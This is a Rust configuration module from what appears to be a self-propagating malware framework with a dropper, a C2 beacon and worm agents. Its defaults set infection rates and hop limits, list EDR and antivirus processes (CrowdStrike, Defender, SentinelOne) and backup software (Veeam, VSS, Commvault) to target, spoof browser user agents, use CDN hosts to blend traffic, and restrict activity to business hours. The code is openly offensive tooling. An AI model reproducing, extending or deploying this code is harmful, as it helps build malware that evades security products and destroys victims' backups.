// Swarm configuration system loaded from colmena.toml.
// Operators customize behavior without recompiling.
// Config can be embedded encrypted in the dropper or loaded from disk.

use crate::panal::HoneycombConfig;
use serde::{Deserialize, Serialize};
use std::path::Path;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HiveConfig {
    pub arena: ArenaConfig,
    pub heartbeat: HeartbeatConfig,
    pub consensus: ConsensusConfig,
    pub agents: AgentsConfig,
    pub c2: C2Config,
    pub limits: LimitsConfig,
    pub timing: TimingConfig,
    pub brain: HoneycombConfig,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ArenaConfig {
    pub name_prefix: String,
    pub max_messages: usize,
    pub max_message_size: usize,
    pub max_agents: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HeartbeatConfig {
    pub interval_secs: u64,
    pub timeout_secs: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ConsensusConfig {
    pub threshold: f32,
    pub hoarder_threshold: f32,
    pub default_reputation: f32,
    pub decay_rate_per_hour: f32,
    pub reward_delta: f32,
    pub penalty_delta: f32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentsConfig {
    pub scout_scan_interval_secs: u64,
    pub shaper_decision_interval_secs: u64,
    pub weaver_mutation_interval_secs: u64,
    pub worm_max_hops: u32,
    pub worm_max_infections_per_minute: u32,
    pub worm_self_destruct_secs: u64,
    pub edr_processes: Vec<String>,
    pub backup_processes: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct C2Config {
    pub url: String,
    pub api_key: String,
    pub http_user_agents: Vec<String>,
    pub cdn_hosts: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LimitsConfig {
    pub max_processes: u32,
    pub max_disk_mb: u64,
    pub max_network_mbps: f64,
    pub business_hours_only: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimingConfig {
    pub heartbeat_interval_secs: u64,
    pub dead_agent_timeout_secs: u64,
    pub regeneration_cooldown_secs: u64,
    pub consensus_timeout_secs: u64,
    pub decision_interval_secs: u64,
    pub scan_interval_secs: u64,
    pub mutation_interval_secs: u64,
}

impl Default for TimingConfig {
    fn default() -> Self {
        Self {
            heartbeat_interval_secs: 10,
            dead_agent_timeout_secs: 30,
            regeneration_cooldown_secs: 60,
            consensus_timeout_secs: 30,
            decision_interval_secs: 30,
            scan_interval_secs: 15,
            mutation_interval_secs: 120,
        }
    }
}

impl Default for HiveConfig {
    fn default() -> Self {
        Self {
            arena: ArenaConfig {
                name_prefix: "swarm_".into(),
                max_messages: 2048,
                max_message_size: 8192,
                max_agents: 16,
            },
            heartbeat: HeartbeatConfig {
                interval_secs: 10,
                timeout_secs: 30,
            },
            consensus: ConsensusConfig {
                threshold: 0.66,
                hoarder_threshold: 0.80,
                default_reputation: 1.0,
                decay_rate_per_hour: 0.2,
                reward_delta: 0.1,
                penalty_delta: 0.2,
            },
            agents: AgentsConfig {
                scout_scan_interval_secs: 15,
                shaper_decision_interval_secs: 30,
                weaver_mutation_interval_secs: 120,
                worm_max_hops: 10,
                worm_max_infections_per_minute: 2,
                worm_self_destruct_secs: 3600,
                edr_processes: vec![
                    "csfalcon".into(),
                    "csagent".into(),
                    "msmpeng".into(),
                    "sentinelone".into(),
                    "carbonblack".into(),
                    "cylancesvc".into(),
                    "symantec".into(),
                    "mcafee".into(),
                ],
                backup_processes: vec![
                    "veeam".into(),
                    "backup_exec".into(),
                    "commvault".into(),
                    "netbackup".into(),
                    "backup_agent".into(),
                    "vss".into(),
                ],
            },
            c2: C2Config {
                url: "http://localhost:8444/beacon".into(),
                api_key: "".into(),
                http_user_agents: vec![
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
                        .into(),
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0".into(),
                ],
                cdn_hosts: vec!["cdn.jsdelivr.net".into(), "cdnjs.cloudflare.com".into()],
            },
            limits: LimitsConfig {
                max_processes: 20,
                max_disk_mb: 100,
                max_network_mbps: 1.0,
                business_hours_only: true,
            },
            timing: TimingConfig::default(),
            brain: HoneycombConfig::default(),
        }
    }
}

impl HiveConfig {
    /// Load config from hive.toml (legacy name: colmena.toml), falling back to defaults.
    ///
    /// See [`Self::load_with_source`] for the search order and error policy.
    pub fn load() -> Self {
        Self::load_with_source().0
    }

    /// Like [`Self::load`], but also reports which file the config came from.
    ///
    /// Returns `(config, source)` where `source` is `None` when no config
    /// file was found (defaults were used).
    ///
    /// Search order: `./hive.toml` (repo root, the file shipped with the
    /// project), then `colmena.toml` (legacy), then system/user config dirs.
    /// A config file that exists but fails to parse is reported loudly
    /// instead of being silently ignored.
    pub fn load_with_source() -> (Self, Option<String>) {
        let paths = [
            "hive.toml",
            "colmena.toml",
            "/etc/swarm/hive.toml",
            "/etc/swarm/colmena.toml",
            &format!(
                "{}/.config/hive/hive.toml",
                std::env::var("HOME").unwrap_or_else(|_| "/tmp".into())
            ),
            &format!(
                "{}/.config/swarm/colmena.toml",
                std::env::var("HOME").unwrap_or_else(|_| "/tmp".into())
            ),
        ];

        for path in &paths {
            if Path::new(path).exists() {
                match std::fs::read_to_string(path) {
                    Ok(content) => match parse_config(&content) {
                        Ok(cfg) => {
                            tracing::info!("Loaded config from {}", path);
                            return (cfg, Some((*path).to_string()));
                        }
                        Err(e) => {
                            tracing::warn!(
                                "Config file {} failed to parse ({}), trying next",
                                path,
                                e
                            );
                        }
                    },
                    Err(e) => {
                        tracing::warn!("Config file {} exists but is unreadable: {}", path, e);
                    }
                }
            }
        }

        tracing::info!("No config file found, using defaults");
        (Self::default(), None)
    }

    /// Load from embedded bytes (dropper scenario).
    pub fn from_embedded(data: &[u8]) -> Option<Self> {
        let s = std::str::from_utf8(data).ok()?;
        toml::from_str(s).ok()
    }
}

/// Parse a `hive.toml` string into a [`HiveConfig`].
///
/// The error is a human-readable rendering of the TOML error, suitable for
/// showing directly to an operator (used by `beekeeper config-check`).
pub fn parse_config(content: &str) -> Result<HiveConfig, String> {
    toml::from_str(content).map_err(|e| e.to_string())
}

/// Generate default colmena.toml for operator customization.
pub fn generate_default_config() -> String {
    let cfg = HiveConfig::default();
    toml::to_string_pretty(&cfg).unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_config_serializes() {
        let cfg = HiveConfig::default();
        let toml_str = toml::to_string_pretty(&cfg).unwrap();
        assert!(toml_str.contains("csfalcon"));
        assert!(toml_str.contains("threshold"));
    }

    #[test]
    fn test_roundtrip() {
        let cfg = HiveConfig::default();
        let toml_str = toml::to_string_pretty(&cfg).unwrap();
        let loaded: HiveConfig = toml::from_str(&toml_str).unwrap();
        assert_eq!(cfg.consensus.threshold, loaded.consensus.threshold);
        assert_eq!(cfg.agents.edr_processes, loaded.agents.edr_processes);
    }

    #[test]
    fn test_parse_config_accepts_defaults() {
        let toml_str = toml::to_string_pretty(&HiveConfig::default()).unwrap();
        let cfg = parse_config(&toml_str).expect("generated default config must parse");
        assert_eq!(cfg.consensus.threshold, 0.66);
    }

    #[test]
    fn test_parse_config_rejects_broken_section_header() {
        // Regression: a broken section header (missing the opening bracket)
        // must produce an error, not a silent fallback to defaults.
        let broken = "eartbeat]\ninterval_secs = 10\ntimeout_secs = 30\n";
        assert!(parse_config(broken).is_err());
    }

    #[test]
    fn test_parse_config_reports_missing_required_section() {
        // A config missing required tables must fail loudly. serde names the
        // FIRST missing field (here inside the `arena` table), not the last.
        let missing = "[arena]\nname_prefix = \"swarm_\"\n";
        let err = parse_config(missing).expect_err("incomplete config must fail");
        assert!(
            err.contains("missing field"),
            "error should name the missing field: {err}"
        );
    }
}
